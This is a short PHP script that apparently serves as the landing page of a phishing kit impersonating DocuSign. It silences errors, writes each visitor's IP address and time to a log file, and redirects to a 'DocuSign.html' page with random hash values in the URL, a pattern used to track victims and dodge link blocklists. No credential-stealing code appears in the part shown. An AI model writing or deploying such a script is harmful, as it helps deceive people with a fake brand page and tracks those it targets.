<?php
session_start();
error_reporting(0);
$ip = getenv("REMOTE_ADDR");
$file = fopen("logs.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$md5 = md5(uniqid(time()));
	header("Location: DocuSign.html?".md5(microtime())."&dispatch=".sha1(microtime())."");
  	exit;
?>